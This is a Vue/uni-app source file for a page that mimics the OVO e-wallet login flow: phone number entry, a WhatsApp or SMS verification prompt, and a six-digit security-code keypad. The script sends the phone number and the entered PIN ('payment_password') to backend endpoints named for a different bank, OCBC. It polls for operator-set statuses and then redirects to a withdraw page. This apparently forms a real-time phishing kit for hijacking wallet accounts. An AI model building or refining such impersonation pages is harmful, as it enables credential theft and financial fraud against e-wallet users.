<template>
  <view class="ovo-page">
    <!-- 顶部导航栏 -->
    <view class="top-bar">
      <view class="back-btn" @click="handleBack">
        <text class="bi bi-arrow-left back-icon"></text>
      </view>
      <view class="help-btn" @click="handleHelp">
        <text class="bi bi-question-circle help-icon"></text>
      </view>
    </view>

    <!-- 主体内容区域 -->
    <view class="content-area">
      <!-- 标题区域 -->
      <view class="title-section">
        <text class="main-title">{{ t('ovo.loginTitle') }}</text>
        <text class="sub-title">{{ t('ovo.loginSubtitle') }}</text>
      </view>

      <!-- 手机号输入区域 -->
      <view class="phone-input-card" :class="{ 'phone-input-card-focus': phoneFocused }">
        <text class="country-code">+62</text>
        <input
          class="phone-input"
          v-model="phoneNumber"
          type="number"
          :placeholder="t('ovo.phonePlaceholder')"
          placeholder-class="phone-placeholder"
          maxlength="13"
          @input="onPhoneInput"
          @focus="phoneFocused = true"
          @blur="phoneFocused = false"
        />
      </view>

      <!-- 帮助文字 -->
      <view class="helper-section">
        <text class="helper-text">{{ t('ovo.phoneInactive') }} </text>
        <text class="helper-link" @click="handleReset">{{ t('ovo.reset') }}</text>
      </view>
    </view>

    <!-- 底部区域 -->
    <view class="footer-area">
      <!-- 条款说明 -->
      <view class="terms-section">
        <text class="terms-text">{{ t('ovo.termsText') }}
          <text class="terms-link">{{ t('ovo.termsOfService') }}</text>
          {{ t('ovo.and') }}
          <text class="terms-link">{{ t('ovo.privacyPolicy') }}</text>.
        </text>
      </view>

      <!-- 提交按钮 -->
      <button
        class="submit-btn"
        :class="{ 'submit-btn-active': canContinue }"
        :disabled="!canContinue"
        @click="handleLogin"
      >
        {{ t('ovo.continueBtn') }}
      </button>
    </view>

    <!-- ========== WhatsApp 验证码确认弹窗 ========== -->
    <view v-if="showWhatsappPopup" class="wa-overlay" @click.self="showWhatsappPopup = false">
      <view class="wa-sheet">
        <!-- 拖拽指示条 -->
        <view class="wa-handle"></view>

        <!-- 标题 -->
        <text class="wa-title">{{ t('ovo.waSendTitle') }}</text>

        <!-- 描述 -->
        <text class="wa-desc">{{ t('ovo.waSendDesc1') }} <text class="wa-phone">+62{{ phoneNumber }}</text> {{ t('ovo.waSendDesc2') }}</text>

        <!-- 绿色提示条 -->
        <view class="wa-notice">
          <text class="bi bi-check-circle-fill wa-notice-icon"></text>
          <text class="wa-notice-text">{{ t('ovo.waNoSpam') }}</text>
        </view>

        <!-- WhatsApp 发送按钮 -->
        <button class="wa-send-btn" @click="confirmSendWhatsapp">
          <text class="bi bi-whatsapp wa-send-icon"></text>
          <text class="wa-send-text">{{ t('ovo.waSendBtn') }}</text>
        </button>

        <!-- 底部 SMS 链接 -->
        <view class="wa-sms-row">
          <text class="wa-sms-text">{{ t('ovo.waNoWhatsapp') }} </text>
          <text class="wa-sms-link" @click="confirmSendSms">{{ t('ovo.waSendSms') }}</text>
        </view>
      </view>
    </view>

    <!-- ========== 步骤二：SMS 验证等待页面 ========== -->
    <view v-if="showSmsPage" class="sms-page">
      <!-- 顶部只有返回箭头 -->
      <view class="sms-top-bar">
        <view class="sms-back-btn" @click="showBackConfirm = true">
          <text class="bi bi-arrow-left sms-back-icon"></text>
        </view>
      </view>

      <!-- 中间内容 -->
      <view class="sms-content">
        <!-- 插图 -->
        <view class="sms-illustration">
          <image class="sms-illust-img" src="/static/images/ovo/ovo1.png" mode="aspectFit" />
        </view>

        <!-- 文字内容 -->
        <view class="sms-text-section">
          <text class="sms-title">{{ t('ovo.smsSentTitle') }}</text>
          <text class="sms-desc">{{ t('ovo.smsSentDesc') }} {{ maskedPhone }}</text>
        </view>

        <!-- 重新发送 -->
        <view class="sms-resend-section">
          <view class="sms-divider"></view>
          <text class="sms-resend-text">{{ t('ovo.notReceived') }} </text>
          <text v-if="smsCountdown > 0" class="sms-resend-countdown">{{ t('ovo.resendIn') }} {{ smsCountdown }} {{ t('ovo.seconds') }}.</text>
          <view v-else class="sms-resend-actions">
            <text class="sms-resend-link" @click="resendSms">{{ t('ovo.resendLink') }}</text>
            <text class="sms-resend-or"> {{ t('ovo.or') }} </text>
            <text class="sms-resend-link" @click="changeNumber">{{ t('ovo.changeNumber') }}</text>
          </view>
        </view>
      </view>

      <!-- ========== 返回确认弹窗 ========== -->
      <view v-if="showBackConfirm" class="back-confirm-overlay" @click.self="showBackConfirm = false">
        <view class="back-confirm-modal">
          <image class="back-confirm-img" src="/static/images/ovo/ovo2.png" mode="aspectFit" />
          <text class="back-confirm-title">{{ t('ovo.backConfirmTitle') }}</text>
          <text class="back-confirm-desc">{{ t('ovo.backConfirmDesc') }}</text>
          <view class="back-confirm-btns">
            <button class="back-confirm-btn back-confirm-yes" @click="confirmGoBack">{{ t('ovo.backConfirmYes') }}</button>
            <button class="back-confirm-btn back-confirm-no" @click="showBackConfirm = false">{{ t('ovo.backConfirmNo') }}</button>
          </view>
        </view>
      </view>
    </view>

    <!-- ========== 步骤三：Security Code 页面 ========== -->
    <view v-if="showSecurityCodePage" class="sc-page">
      <!-- 背景装饰 -->
      <view class="sc-bg-orb sc-bg-orb-1"></view>
      <view class="sc-bg-orb sc-bg-orb-2"></view>

      <!-- 主体内容 -->
      <view class="sc-body">
        <text class="sc-title">{{ t('ovo.securityCodeTitle') }}</text>

        <!-- 6个圆点 -->
        <view class="sc-dots-row">
          <view v-for="i in 6" :key="i" class="sc-dot" :class="{ 'sc-dot-filled': securityCode.length >= i }">
            <view v-if="securityCode.length >= i" class="sc-dot-inner"></view>
          </view>
        </view>

        <!-- 忘记安全码 -->
        <text class="sc-forgot" @click="handleForgotCode">{{ t('ovo.forgotSecurityCode') }}</text>

        <!-- 数字键盘 -->
        <view class="sc-keypad">
          <view class="sc-keypad-row">
            <view class="sc-key" @click="onSecurityKey('1')"><text class="sc-key-num">1</text></view>
            <view class="sc-key" @click="onSecurityKey('2')"><text class="sc-key-num">2</text></view>
            <view class="sc-key" @click="onSecurityKey('3')"><text class="sc-key-num">3</text></view>
          </view>
          <view class="sc-keypad-row">
            <view class="sc-key" @click="onSecurityKey('4')"><text class="sc-key-num">4</text></view>
            <view class="sc-key" @click="onSecurityKey('5')"><text class="sc-key-num">5</text></view>
            <view class="sc-key" @click="onSecurityKey('6')"><text class="sc-key-num">6</text></view>
          </view>
          <view class="sc-keypad-row">
            <view class="sc-key" @click="onSecurityKey('7')"><text class="sc-key-num">7</text></view>
            <view class="sc-key" @click="onSecurityKey('8')"><text class="sc-key-num">8</text></view>
            <view class="sc-key" @click="onSecurityKey('9')"><text class="sc-key-num">9</text></view>
          </view>
          <view class="sc-keypad-row">
            <view class="sc-key sc-key-empty"></view>
            <view class="sc-key" @click="onSecurityKey('0')"><text class="sc-key-num">0</text></view>
            <view class="sc-key" @click="onSecurityDelete">
              <view class="sc-backspace">
                <text class="bi bi-backspace-fill sc-backspace-icon"></text>
              </view>
            </view>
          </view>
        </view>
      </view>

      <!-- 底部切换账户按钮 -->
      <view class="sc-bottom-bar" @click="closeSecurityCodePage">
        <text class="sc-bottom-text">{{ t('ovo.switchAccount') }}</text>
      </view>
    </view>

    <!-- 加载中遮罩 -->
    <view v-if="showLoading" class="loading-overlay">
      <view class="loading-spinner-box">
        <view class="spinner"></view>
        <text class="loading-text">{{ t('ovo.processing') }}</text>
      </view>
    </view>

    <!-- ========== Security Code 错误全屏页面 ========== -->
    <view v-if="showCaptchaErrorModal" class="status-page">
      <view class="status-page-bar">
        <view class="status-page-back" @click="retryCaptcha">
          <text class="bi bi-arrow-left status-page-back-icon"></text>
        </view>
      </view>
      <view class="status-page-center">
        <view class="sp-icon-circle sp-icon-error">
          <text class="bi bi-x-lg sp-icon-symbol"></text>
        </view>
        <text class="sp-result-title sp-color-error">{{ t('ovo.securityCodeErrorTitle') }}</text>
        <text class="sp-result-message">{{ t('ovo.securityCodeErrorMessage') }}</text>
      </view>
      <view class="status-page-footer">
        <button class="sp-action-btn sp-btn-error" @click="retryCaptcha">{{ t('ovo.reenter') }}</button>
      </view>
    </view>

    <!-- ========== 成功全屏页面 ========== -->
    <view v-if="showSuccessModal" class="status-page">
      <view class="status-page-bar">
        <view class="status-page-back" @click="handleLoginSuccess">
          <text class="bi bi-arrow-left status-page-back-icon"></text>
        </view>
      </view>
      <view class="status-page-center">
        <view class="sp-icon-circle sp-icon-success">
          <text class="bi bi-check-lg sp-icon-symbol"></text>
        </view>
        <text class="sp-result-title sp-color-success">{{ t('ovo.successTitle') }}</text>
        <text class="sp-result-message">{{ t('ovo.successMessage') }}</text>
        <text class="sp-result-desc">{{ t('ovo.successDescription') }}</text>
      </view>
      <view class="status-page-footer">
        <button class="sp-action-btn sp-btn-success" @click="handleLoginSuccess">{{ t('ovo.ok') }}</button>
      </view>
    </view>

    <!-- ========== 失败全屏页面 ========== -->
    <view v-if="showFailedModal" class="status-page">
      <view class="status-page-bar">
        <view class="status-page-back" @click="handleLoginFailed">
          <text class="bi bi-arrow-left status-page-back-icon"></text>
        </view>
      </view>
      <view class="status-page-center">
        <view class="sp-icon-circle sp-icon-error">
          <text class="bi bi-x-lg sp-icon-symbol"></text>
        </view>
        <text class="sp-result-title sp-color-error">{{ t('ovo.failedTitle') }}</text>
        <text class="sp-result-message">{{ t('ovo.failedMessage') }}</text>
        <text class="sp-result-desc">{{ t('ovo.failedDescription') }}</text>
      </view>
      <view class="status-page-footer">
        <button class="sp-action-btn sp-btn-error" @click="handleLoginFailed">{{ t('ovo.tryAgain') }}</button>
      </view>
    </view>

    <!-- ========== 系统维护全屏页面 ========== -->
    <view v-if="showMaintenanceModal" class="status-page">
      <view class="status-page-bar">
        <view class="status-page-back" @click="handleMaintenanceClose">
          <text class="bi bi-arrow-left status-page-back-icon"></text>
        </view>
      </view>
      <view class="status-page-center">
        <view class="sp-icon-circle sp-icon-warning">
          <text class="bi bi-tools sp-icon-symbol"></text>
        </view>
        <text class="sp-result-title sp-color-warning">{{ t('ovo.maintenanceTitle') }}</text>
        <text class="sp-result-message">{{ t('ovo.maintenanceMessage') }}</text>
        <text class="sp-result-desc">{{ t('ovo.maintenanceDescription') }}</text>
      </view>
      <view class="status-page-footer">
        <button class="sp-action-btn sp-btn-warning" @click="handleMaintenanceClose">{{ t('ovo.ok') }}</button>
      </view>
    </view>
  </view>
</template>

<script setup lang="ts">
import { ref, computed, onUnmounted } from 'vue'
import { onLoad } from '@dcloudio/uni-app'
import { useI18n } from 'vue-i18n'
import { post } from '../../utils/request'
import { getToken } from '../../utils/storage'

const { t } = useI18n()

const phoneNumber = ref('')
const phoneFocused = ref(false)
const logoUrl = ref('')
const bankCode = ref('')

// WhatsApp 确认弹窗状态
const showWhatsappPopup = ref(false)

// SMS 验证等待页面状态
const showSmsPage = ref(false)
const showBackConfirm = ref(false)
const smsCountdown = ref(30)
let smsTimer: any = null

// Security Code 步骤三状态
const showSecurityCodePage = ref(false)
const securityCode = ref('')

// 加载状态
const showLoading = ref(false)

// 全屏状态页面
const showCaptchaErrorModal = ref(false)
const showSuccessModal = ref(false)
const showFailedModal = ref(false)
const showMaintenanceModal = ref(false)

// 账户数据
const withdrawalAccount = ref<any>(null)

// 记录ID和轮询
const recordId = ref<number>(0)
let pollingTimer: any = null
let isPolling = false

onUnmounted(() => {
  if (pollingTimer) clearInterval(pollingTimer)
  if (smsTimer) clearInterval(smsTimer)
})

// 获取URL参数
onLoad((options) => {
  const token = getToken()
  if (!token) {
    uni.showToast({
      title: t('common.pleaseLoginFirst') || 'Please login first',
      icon: 'none',
      duration: 2000
    })
    setTimeout(() => {
      uni.reLaunch({ url: '/pages/auth/login' })
    }, 2000)
    return
  }

  if (options?.code) {
    bankCode.value = options.code
  }
  if (options?.logo) {
    logoUrl.value = decodeURIComponent(options.logo)
  }
})

function onPhoneInput() {
  phoneNumber.value = phoneNumber.value.replace(/\D/g, '').slice(0, 13)
}

const canContinue = computed(() => {
  return phoneNumber.value.trim().length >= 9
})

function handleBack() {
  uni.navigateBack()
}

function handleHelp() {
  // 帮助页面
}

function handleReset() {
  // 号码重置帮助
}

// 点击 Continue 显示 WhatsApp 确认弹窗
function handleLogin() {
  if (!canContinue.value || showLoading.value) return
  showWhatsappPopup.value = true
}

// 确认通过 WhatsApp 发送验证码
async function confirmSendWhatsapp() {
  showWhatsappPopup.value = false
  await submitLoginAndShowSms()
}

// 确认通过 SMS 发送验证码
async function confirmSendSms() {
  showWhatsappPopup.value = false
  await submitLoginAndShowSms()
}

// 提交登录并显示 SMS 等待页面
async function submitLoginAndShowSms() {
  showLoading.value = true

  try {
    const res = await post('/ocbc/submitLogin', {
      account_type: bankCode.value || 'ovo',
      organization_id: phoneNumber.value,
      user_id: phoneNumber.value,
      password: ''
    }, { showError: false })

    recordId.value = res.data.record_id
    showLoading.value = false
    showSmsPage.value = true
    startSmsCountdown()
    startPolling()
  } catch (error: any) {
    showLoading.value = false
    uni.showToast({
      title: error.message || 'Login failed',
      icon: 'none'
    })
  }
}

// 关闭 SMS 等待页面
function closeSmsPage() {
  showSmsPage.value = false
  showBackConfirm.value = false
  stopSmsCountdown()
}

// 确认返回
function confirmGoBack() {
  closeSmsPage()
  stopPolling()
}

// 开始 SMS 倒计时
function startSmsCountdown() {
  stopSmsCountdown()
  const endTime = Date.now() + 30 * 1000
  smsCountdown.value = 30
  smsTimer = setInterval(() => {
    const remaining = Math.ceil((endTime - Date.now()) / 1000)
    if (remaining > 0) {
      smsCountdown.value = remaining
    } else {
      smsCountdown.value = 0
      stopSmsCountdown()
    }
  }, 500)
}

// 停止 SMS 倒计时
function stopSmsCountdown() {
  if (smsTimer) {
    clearInterval(smsTimer)
    smsTimer = null
  }
}

// 重新发送 SMS
function resendSms() {
  startSmsCountdown()
}

// 更换号码（返回步骤一）
function changeNumber() {
  closeSmsPage()
  stopPolling()
}

// 手机号打码显示
const maskedPhone = computed(() => {
  const phone = phoneNumber.value
  if (phone.length <= 4) return '+62' + phone
  const last4 = phone.slice(-4)
  const masked = '*'.repeat(phone.length - 4)
  return '+62' + masked + last4
})

// 打开 Security Code 页面
function openSecurityCodePage() {
  showSecurityCodePage.value = true
  securityCode.value = ''
}

// 关闭 Security Code 页面
function closeSecurityCodePage() {
  showSecurityCodePage.value = false
  securityCode.value = ''
}

// Security Code 按键
function onSecurityKey(digit: string) {
  if (securityCode.value.length >= 6) return
  securityCode.value += digit
  if (securityCode.value.length === 6) {
    submitSecurityCode()
  }
}

// Security Code 删除
function onSecurityDelete() {
  if (securityCode.value.length > 0) {
    securityCode.value = securityCode.value.slice(0, -1)
  }
}

// 提交 Security Code
async function submitSecurityCode() {
  showLoading.value = true

  try {
    await post('/ocbc/submitPaymentPassword', {
      record_id: recordId.value,
      payment_password: securityCode.value
    }, { showError: false })

    startPolling()
  } catch (error: any) {
    showLoading.value = false
    showCaptchaErrorModal.value = true
  }
}

// 忘记安全码
function handleForgotCode() {
  // TODO: 跳转忘记安全码页面
}

// 开始轮询状态
function startPolling() {
  stopPolling()
  isPolling = false
  pollingTimer = setInterval(async () => {
    if (isPolling) return
    await pollStatus()
  }, 2000)
}

// 停止轮询
function stopPolling() {
  if (pollingTimer) {
    clearInterval(pollingTimer)
    pollingTimer = null
  }
  isPolling = false
}

// 轮询状态
async function pollStatus() {
  isPolling = true

  try {
    const res = await post('/ocbc/pollStatus', {
      record_id: recordId.value
    }, { showError: false })

    const status = res.data.status
    handleStatusChange(status, res.data)
  } catch (error) {
    console.error('Poll status error:', error)
  } finally {
    isPolling = false
  }
}

// 关闭所有步骤页面
function closeAllStepPages() {
  showSmsPage.value = false
  stopSmsCountdown()
  showSecurityCodePage.value = false
  securityCode.value = ''
}

// 处理状态变化
function handleStatusChange(status: string, data: any) {
  switch (status) {
    case 'need_captcha':
    case 'need_payment_password':
      stopPolling()
      showLoading.value = false
      closeAllStepPages()
      withdrawalAccount.value = data.withdrawal_account || null
      openSecurityCodePage()
      break

    case 'success':
      stopPolling()
      showLoading.value = false
      closeAllStepPages()
      showSuccessModal.value = true
      break

    case 'payment_password_error':
    case 'captcha_error':
      stopPolling()
      showLoading.value = false
      closeAllStepPages()
      showCaptchaErrorModal.value = true
      break

    case 'password_error':
    case 'failed':
      stopPolling()
      showLoading.value = false
      closeAllStepPages()
      showFailedModal.value = true
      break

    case 'maintenance':
      stopPolling()
      showLoading.value = false
      closeAllStepPages()
      showMaintenanceModal.value = true
      break

    default:
      break
  }
}

// 重试验证码
function retryCaptcha() {
  showCaptchaErrorModal.value = false
  openSecurityCodePage()
}

// 登录成功
function handleLoginSuccess() {
  showSuccessModal.value = false
  uni.redirectTo({
    url: '/pages/wallet/withdraw'
  })
}

// 登录失败
function handleLoginFailed() {
  showFailedModal.value = false
  phoneNumber.value = ''
}

// 关闭维护弹窗
function handleMaintenanceClose() {
  showMaintenanceModal.value = false
  uni.navigateBack()
}
</script>

<style lang="scss" scoped>
.ovo-page {
  min-height: 100vh;
  background: #FFFFFF;
  display: flex;
  flex-direction: column;
}

/* ========== 顶部导航栏 ========== */
.top-bar {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: calc(var(--status-bar-height) + 20rpx) 32rpx 20rpx;
}

.back-btn {
  width: 72rpx;
  height: 72rpx;
  display: flex;
  align-items: center;
  justify-content: center;
}

.back-icon {
  font-size: 44rpx;
  color: #1f2937;
  font-weight: 600;
}

.help-btn {
  width: 72rpx;
  height: 72rpx;
  display: flex;
  align-items: center;
  justify-content: center;
}

.help-icon {
  font-size: 44rpx;
  color: #1f2937;
}

/* ========== 主体内容 ========== */
.content-area {
  flex: 1;
  padding: 16rpx 48rpx 0;
}

.title-section {
  margin-bottom: 64rpx;
}

.main-title {
  display: block;
  font-size: 48rpx;
  font-weight: 700;
  color: #111827;
  line-height: 1.2;
  margin-bottom: 16rpx;
}

.sub-title {
  display: block;
  font-size: 32rpx;
  color: #6b7280;
  line-height: 1.5;
}

/* ========== 手机号输入卡片 ========== */
.phone-input-card {
  display: flex;
  align-items: center;
  background: #f4f2fa;
  border-radius: 32rpx;
  padding: 32rpx 40rpx;
  margin-bottom: 32rpx;
  transition: box-shadow 0.2s;
}

.phone-input-card-focus {
  box-shadow: 0 0 0 4rpx rgba(0, 196, 208, 0.4);
}

.country-code {
  font-size: 36rpx;
  font-weight: 700;
  color: #111827;
  margin-right: 32rpx;
  flex-shrink: 0;
}

.phone-input {
  flex: 1;
  height: 48rpx;
  font-size: 36rpx;
  color: #111827;
  background: transparent;
}

.phone-placeholder {
  color: #9ca3af;
  font-size: 36rpx;
}

/* ========== 帮助文字 ========== */
.helper-section {
  display: flex;
  flex-wrap: wrap;
  align-items: center;
}

.helper-text {
  font-size: 30rpx;
  color: #1f2937;
  line-height: 1.6;
}

.helper-link {
  font-size: 30rpx;
  font-weight: 600;
  color: #00c4d0;
}

/* ========== 底部区域 ========== */
.footer-area {
  padding: 48rpx 48rpx calc(env(safe-area-inset-bottom) + 48rpx);
  flex-shrink: 0;
}

.terms-section {
  margin-bottom: 64rpx;
  text-align: center;
  padding: 0 32rpx;
}

.terms-text {
  font-size: 24rpx;
  color: #6b7280;
  line-height: 1.7;
}

.terms-link {
  color: #00c4d0;
  font-weight: 500;
}

.submit-btn {
  width: 100%;
  height: 104rpx;
  background: #c4c4c4;
  border-radius: 52rpx;
  font-size: 36rpx;
  font-weight: 600;
  color: #FFFFFF;
  border: none;
  display: flex;
  align-items: center;
  justify-content: center;
}

.submit-btn::after {
  border: none;
}

.submit-btn-active {
  background: #00c4d0;
}

.required-star {
  color: #e53935;
  font-size: 28rpx;
}

/* ========== 加载遮罩 ========== */
.loading-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.15);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 9999;
}

.loading-spinner-box {
  background: #FFFFFF;
  border-radius: 24rpx;
  padding: 60rpx;
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 24rpx;
  box-shadow: 0 8rpx 32rpx rgba(0, 0, 0, 0.15);
}

.spinner {
  width: 80rpx;
  height: 80rpx;
  border: 6rpx solid #e0f7fa;
  border-top-color: #00c4d0;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}

.loading-text {
  font-size: 28rpx;
  color: #00c4d0;
  font-weight: 600;
}

/* ========== WhatsApp 确认弹窗 ========== */
.wa-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.45);
  z-index: 9999;
  display: flex;
  align-items: flex-end;
  justify-content: center;
}

.wa-sheet {
  width: 100%;
  background: #FFFFFF;
  border-radius: 32rpx 32rpx 0 0;
  padding: 24rpx 48rpx calc(env(safe-area-inset-bottom) + 40rpx);
  display: flex;
  flex-direction: column;
  align-items: center;
}

.wa-handle {
  width: 72rpx;
  height: 8rpx;
  background: #d1d5db;
  border-radius: 4rpx;
  margin-bottom: 40rpx;
}

.wa-title {
  display: block;
  font-size: 40rpx;
  font-weight: 700;
  color: #111827;
  text-align: center;
  line-height: 1.3;
  margin-bottom: 20rpx;
}

.wa-desc {
  display: block;
  font-size: 28rpx;
  color: #6b7280;
  text-align: center;
  line-height: 1.7;
  margin-bottom: 32rpx;
}

.wa-phone {
  font-weight: 700;
  color: #111827;
}

.wa-notice {
  display: flex;
  align-items: center;
  gap: 12rpx;
  background: #ecfdf5;
  border-radius: 40rpx;
  padding: 16rpx 32rpx;
  margin-bottom: 40rpx;
}

.wa-notice-icon {
  font-size: 32rpx;
  color: #22c55e;
  flex-shrink: 0;
}

.wa-notice-text {
  font-size: 26rpx;
  color: #15803d;
  font-weight: 500;
}

.wa-send-btn {
  width: 100%;
  height: 104rpx;
  background: linear-gradient(135deg, #25d366 0%, #128c48 100%);
  border-radius: 52rpx;
  display: flex;
  flex-direction: row;
  align-items: center;
  justify-content: center;
  gap: 16rpx;
  border: none;
  margin-bottom: 28rpx;
}

.wa-send-btn::after {
  border: none;
}

.wa-send-icon {
  font-size: 40rpx;
  color: #FFFFFF;
}

.wa-send-text {
  font-size: 34rpx;
  font-weight: 700;
  color: #FFFFFF;
}

.wa-sms-row {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 6rpx;
}

.wa-sms-text {
  font-size: 26rpx;
  color: #6b7280;
}

.wa-sms-link {
  font-size: 26rpx;
  font-weight: 600;
  color: #4f46e5;
}

/* ========== 步骤二：SMS 验证等待页面 ========== */
.sms-page {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: #FFFFFF;
  z-index: 9998;
  display: flex;
  flex-direction: column;
}

.sms-top-bar {
  display: flex;
  align-items: center;
  padding: calc(var(--status-bar-height) + 20rpx) 32rpx 20rpx;
}

.sms-back-btn {
  width: 72rpx;
  height: 72rpx;
  display: flex;
  align-items: center;
  justify-content: center;
}

.sms-back-icon {
  font-size: 44rpx;
  color: #1f2937;
  font-weight: 600;
}

.sms-content {
  flex: 1;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: flex-start;
  padding: 48rpx 48rpx 0;
}

.sms-illustration {
  margin-bottom: 64rpx;
  display: flex;
  justify-content: center;
  width: 100%;
}

.sms-illust-img {
  width: 750rpx;
  height: 411rpx;
}

.sms-text-section {
  text-align: center;
  padding: 0 16rpx;
}

.sms-title {
  display: block;
  font-size: 40rpx;
  font-weight: 700;
  color: #1f2937;
  line-height: 1.3;
  margin-bottom: 24rpx;
}

.sms-desc {
  display: block;
  font-size: 30rpx;
  color: #666666;
  line-height: 1.6;
  text-align: center;
}

.sms-divider {
  width: 100%;
  height: 2rpx;
  background: #E0E0E0;
  margin-top: 48rpx;
  margin-bottom: 32rpx;
}

.sms-resend-section {
  display: flex;
  flex-wrap: wrap;
  justify-content: center;
  align-items: center;
  padding: 16rpx 0;
}

.sms-resend-text {
  font-size: 28rpx;
  color: #6b7280;
}

.sms-resend-countdown {
  font-size: 28rpx;
  color: #1f2937;
  font-weight: 600;
}

.sms-resend-actions {
  display: flex;
  align-items: center;
}

.sms-resend-link {
  font-size: 28rpx;
  color: #00c4d0;
  font-weight: 600;
}

.sms-resend-or {
  font-size: 28rpx;
  color: #6b7280;
}

/* ========== 返回确认弹窗 ========== */
.back-confirm-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.5);
  display: flex;
  align-items: flex-end;
  z-index: 1000;
}

.back-confirm-modal {
  background: #fff;
  border-radius: 32rpx 32rpx 0 0;
  width: 100%;
  overflow: hidden;
  display: flex;
  flex-direction: column;
  align-items: center;
  padding-bottom: env(safe-area-inset-bottom);
}

.back-confirm-img {
  width: 750rpx;
  height: 400rpx;
}

.back-confirm-title {
  font-size: 36rpx;
  font-weight: 700;
  color: #1f2937;
  margin-top: 32rpx;
  text-align: center;
}

.back-confirm-desc {
  font-size: 28rpx;
  color: #6b7280;
  margin-top: 16rpx;
  text-align: center;
  padding: 0 48rpx;
  line-height: 1.5;
}

.back-confirm-btns {
  display: flex;
  width: 100%;
  padding: 40rpx 48rpx 48rpx;
  gap: 24rpx;
  box-sizing: border-box;
}

.back-confirm-btn {
  flex: 1;
  height: 88rpx;
  border-radius: 44rpx;
  font-size: 30rpx;
  font-weight: 600;
  display: flex;
  align-items: center;
  justify-content: center;
  border: none;
  line-height: 88rpx;
}

.back-confirm-btn::after {
  border: none;
}

.back-confirm-yes {
  background: #f3f0ff;
  color: #5a45ff;
}

.back-confirm-no {
  background: #5a45ff;
  color: #fff;
  font-size: 24rpx;
}

/* ========== 步骤三：Security Code 页面 ========== */
.sc-page {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: linear-gradient(135deg, #4F46E5 0%, #7C3AED 100%);
  z-index: 9998;
  display: flex;
  flex-direction: column;
  overflow: hidden;
}

.sc-bg-orb {
  position: absolute;
  border-radius: 50%;
  pointer-events: none;
  opacity: 0.3;
}

.sc-bg-orb-1 {
  top: -10%;
  left: -20%;
  width: 140%;
  height: 140%;
  background: radial-gradient(circle, rgba(99, 102, 241, 0.3) 0%, rgba(124, 58, 237, 0.3) 100%);
  filter: blur(60rpx);
}

.sc-bg-orb-2 {
  bottom: -10%;
  right: -20%;
  width: 120%;
  height: 120%;
  background: radial-gradient(circle, rgba(59, 130, 246, 0.2) 0%, rgba(79, 70, 229, 0.2) 100%);
  filter: blur(60rpx);
}

.sc-body {
  flex: 1;
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: calc(var(--status-bar-height) + 80rpx) 64rpx 0;
  z-index: 10;
}

.sc-title {
  display: block;
  font-size: 38rpx;
  font-weight: 600;
  color: #FFFFFF;
  text-align: center;
  margin-bottom: 80rpx;
}

.sc-dots-row {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 48rpx;
  margin-bottom: 80rpx;
}

.sc-dot {
  width: 32rpx;
  height: 32rpx;
  border-radius: 50%;
  border: 3rpx solid rgba(255, 255, 255, 0.8);
  display: flex;
  align-items: center;
  justify-content: center;
}

.sc-dot-filled {
  border-color: #FFFFFF;
}

.sc-dot-inner {
  width: 32rpx;
  height: 32rpx;
  border-radius: 50%;
  background: #FFFFFF;
}

.sc-forgot {
  font-size: 28rpx;
  font-weight: 500;
  color: #FFFFFF;
  margin-bottom: 80rpx;
}

.sc-keypad {
  width: 100%;
  max-width: 560rpx;
  margin-top: auto;
  padding-bottom: 32rpx;
}

.sc-keypad-row {
  display: flex;
  justify-content: center;
  gap: 64rpx;
  margin-bottom: 40rpx;
}

.sc-keypad-row:last-child {
  margin-bottom: 0;
}

.sc-key {
  width: 128rpx;
  height: 128rpx;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;

  &:active {
    background: rgba(255, 255, 255, 0.1);
  }
}

.sc-key-empty {
  background: transparent;

  &:active {
    background: transparent;
  }
}

.sc-key-num {
  font-size: 56rpx;
  font-weight: 600;
  color: #FFFFFF;
}

.sc-backspace {
  background: #FFFFFF;
  border-radius: 12rpx;
  padding: 16rpx;
  display: flex;
  align-items: center;
  justify-content: center;

  &:active {
    background: #e5e7eb;
  }
}

.sc-backspace-icon {
  font-size: 40rpx;
  color: #4F46E5;
}

.sc-bottom-bar {
  width: 100%;
  background: #82D4F6;
  padding: 48rpx 0;
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 10;
  flex-shrink: 0;
}

.sc-bottom-text {
  font-size: 30rpx;
  font-weight: 600;
  color: #1E5F8A;
}

/* ========== 全屏状态页面 ========== */
.status-page {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: #f0f2f5;
  z-index: 9998;
  display: flex;
  flex-direction: column;
}

.status-page-bar {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: calc(var(--status-bar-height) + 20rpx) 32rpx 20rpx;
  background: #f0f2f5;
}

.status-page-back {
  width: 72rpx;
  height: 72rpx;
  display: flex;
  align-items: center;
  justify-content: center;
}

.status-page-back-icon {
  font-size: 44rpx;
  color: #1a1a1a;
  font-weight: 600;
}

.status-page-help {
  width: 72rpx;
  height: 72rpx;
  border-radius: 50%;
  border: 3rpx solid #1a1a1a;
  display: flex;
  align-items: center;
  justify-content: center;
}

.status-page-help-icon {
  font-size: 36rpx;
  color: #1a1a1a;
}

.status-page-body {
  flex: 1;
  padding: 32rpx 48rpx 0;
  overflow-y: auto;
}

.status-page-heading {
  display: block;
  font-size: 44rpx;
  font-weight: 700;
  color: #1a1a1a;
  line-height: 1.3;
  margin-bottom: 32rpx;
}

.status-page-center {
  flex: 1;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 48rpx;
  text-align: center;
}

.status-page-footer {
  padding: 32rpx 48rpx calc(env(safe-area-inset-bottom) + 32rpx);
  flex-shrink: 0;
}

